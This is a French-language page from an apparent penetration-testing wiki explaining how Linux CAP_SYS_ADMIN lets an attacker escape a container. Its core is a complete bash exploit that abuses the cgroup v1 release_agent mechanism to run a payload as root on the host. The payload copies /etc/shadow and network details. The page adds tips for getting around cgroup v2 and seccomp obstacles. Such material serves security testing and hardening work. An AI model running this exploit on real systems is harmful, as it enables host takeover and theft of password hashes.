---
title: "CAP_SYS_ADMIN : les montages et l'évasion via release_agent à partir d'une seule capacité"
order: 1
description: "CAP_SYS_ADMIN est la capacité Linux la plus large et suffit à s'évader d'un conteneur à elle seule : elle déverrouille l'appel système mount, de sorte qu'un attaquant peut monter le système de fichiers cgroup v1 et abuser de notify_on_release plus release_agent pour exécuter un programme en tant que root sur l'hôte, ou effectuer pivot_root et monter des chemins de l'hôte directement."
keywords:
  - cap_sys_admin
  - appel système mount
  - release_agent
  - évasion cgroup
  - évasion de conteneur
---

# CAP_SYS_ADMIN

`CAP_SYS_ADMIN` est souvent appelée le nouveau root : le noyau verrouille derrière elle une quarantaine d'opérations distinctes, et la plus utile pour s'évader d'un conteneur est `mount(2)`. Grâce à la capacité de monter des systèmes de fichiers dans l'espace de noms de montage du conteneur, un attaquant atteint le mécanisme `release_agent` de cgroup v1, que le noyau exécute en tant que root dans les espaces de noms de l'hôte. C'est pourquoi l'ajout de cette seule capacité, même sans `--privileged`, est généralement une compromission totale.

Confirmez la capacité et que le montage fonctionne :

```bash
capsh --print | grep -o cap_sys_admin
grep CapEff /proc/self/status        # bit 21 set
```

## Voie : release_agent de cgroup v1

`release_agent` est un chemin que le noyau invoque, en tant que nouveau processus root sur l'hôte, lorsque le dernier processus quitte un cgroup dont `notify_on_release` est positionné. `CAP_SYS_ADMIN` permet au conteneur de monter une nouvelle hiérarchie cgroup v1 et d'écrire les deux fichiers :

```bash
# 1. Mount a cgroup v1 controller we can create groups under
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x

# 2. Turn on release notification for the child group
echo 1 > /tmp/cg/x/notify_on_release

# 3. release_agent runs in the HOST filesystem view, so the payload path
#    must be resolvable there. Recover this container's rootfs on the host:
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$host_path/payload" > /tmp/cg/release_agent

# 4. Drop the payload at that host-visible path
cat > /payload <<SH
#!/bin/sh
ip a > $host_path/net.txt 2>&1
cat /etc/shadow > $host_path/shadow.txt 2>&1
SH
chmod +x /payload

# 5. Trigger: a process that enters then exits the child cgroup empties it
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
sleep 1 && cat /net.txt /shadow.txt
```

La subtilité de l'étape 3 est que le noyau exécute `release_agent` depuis le système de fichiers racine de l'hôte, et non celui du conteneur, de sorte qu'écrire `/payload` à l'intérieur du conteneur est inutile à moins de pointer `release_agent` vers le chemin `upperdir` de l'overlay où ce même fichier apparaît sur l'hôte. Le lire depuis `/proc/self/mountinfo` rend l'exploit portable d'un hôte à l'autre.

## Voie : pivot_root et montages directs de l'hôte

Si un périphérique de l'hôte est accessible (par exemple parce que le conteneur a aussi un accès aux périphériques), `CAP_SYS_ADMIN` vous permet de le monter et d'effectuer `pivot_root` dedans, offrant un shell root interactif sur l'hôte sans la manœuvre release_agent. Cela recoupe [Périphérique bloc de l'hôte](../device-access/host-block-device.md).

## Notes d'exploitation

- La voie release_agent nécessite une hiérarchie cgroup v1. Sur un hôte uniquement en cgroup v2, `mount -t cgroup` n'a rien à quoi se rattacher ; vérifiez `ls /sys/fs/cgroup/release_agent` et `mount | grep cgroup2`. Repliez-vous sur un chargement de module ou un montage de périphérique.
- Certains runtimes durcis conservent `CAP_SYS_ADMIN` mais ajoutent un filtre seccomp qui bloque `mount` ; vérifiez avec `grep Seccomp /proc/self/status` et testez un `mount -t tmpfs none /mnt` jetable.
- Cette capacité est impliquée par `--privileged` ; voir [Flag privileged](../privileged-flag.md) et la page autonome [cgroups release_agent](../cgroups-release-agent.md) pour la technique complète du handler.

## Références

- [man 7 capabilities : CAP_SYS_ADMIN](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Trail of Bits : Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [man 7 cgroups : notify_on_release and release_agent](https://man7.org/linux/man-pages/man7/cgroups.7.html)
